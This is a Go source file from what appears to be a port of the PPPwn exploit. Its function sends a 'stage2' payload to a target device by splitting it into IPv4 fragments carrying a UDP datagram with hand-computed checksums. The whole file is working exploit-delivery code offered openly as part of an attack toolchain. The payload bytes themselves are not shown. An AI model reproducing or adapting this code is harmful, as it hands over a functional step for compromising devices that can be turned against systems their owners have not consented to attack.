package exploit

import (
	"bytes"
	"encoding/binary"
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"

	"github.com/wetor/PPPwn_go/internal/logger"
	"github.com/wetor/PPPwn_go/internal/packet"
	"github.com/wetor/PPPwn_go/internal/utils"
)

func (e *Exploit) runStage4() (err error) {
	logger.Infof("[*] Sending stage2 payload...")

	fragmentSize := 1024
	offset := 0
	udpHeaderLen := 8
	udpDataLen := 8
	eth := &layers.Ethernet{
		SrcMAC:       e.sourceMac,
		DstMAC:       e.targetMac,
		EthernetType: layers.EthernetTypeIPv4,
	}
	udp := &layers.UDP{
		SrcPort: 53,
		DstPort: STAGE2_PORT,
	}

	ipv4 := &layers.IPv4{
		Version:  4,
		Id:       1,
		SrcIP:    net.ParseIP(SOURCE_IPV4),
		DstIP:    net.ParseIP(TARGET_IPV4),
		Protocol: layers.IPProtocolUDP,
		TTL:      64,
		Flags:    layers.IPv4MoreFragments,
	}
	var layer []gopacket.SerializableLayer
	for offset < len(e.stage2) {
		fOffset := uint16(offset / 8)
		if offset != 0 {
			fOffset++
		}
		ipv4.FragOffset = fOffset
		payloadSize := fragmentSize

		// first
		if offset == 0 {
			payloadSize -= udpDataLen
		}
		// last
		if offset+payloadSize >= len(e.stage2) {
			ipv4.Flags = 0
			payloadSize = len(e.stage2) - offset
		}

		payload := gopacket.Payload(e.stage2[offset : offset+payloadSize])
		offset += payloadSize
		// first
		if offset == payloadSize {
			udp.Length = uint16(udpHeaderLen + len(e.stage2))
			err = udp.SetNetworkLayerForChecksum(ipv4)
			if err != nil {
				return err
			}
			data, err := e.p.ToBytes(&packet.SendParams{
				Layers: []gopacket.SerializableLayer{
					udp,
				},
			})
			if err != nil {
				return err
			}
			checkData := bytes.NewBuffer(data)
			checkData.Write(e.stage2)
			checksum := utils.IPv4UDPChecksum(ipv4.SrcIP.To4(), ipv4.DstIP.To4(), uint8(layers.IPProtocolUDP), checkData.Bytes())
			binary.BigEndian.PutUint16(data[6:8], checksum)
			layer = []gopacket.SerializableLayer{eth, ipv4, gopacket.Payload(data), payload}
		} else {
			layer = []gopacket.SerializableLayer{eth, ipv4, payload}
		}
		err = e.p.Send(&packet.SendParams{
			FixLengths:       true,
			ComputeChecksums: true,
			Layers:           layer,
		})
		if err != nil {
			return err
		}
	}
	logger.Infof("[+] Done!")
	return nil
}
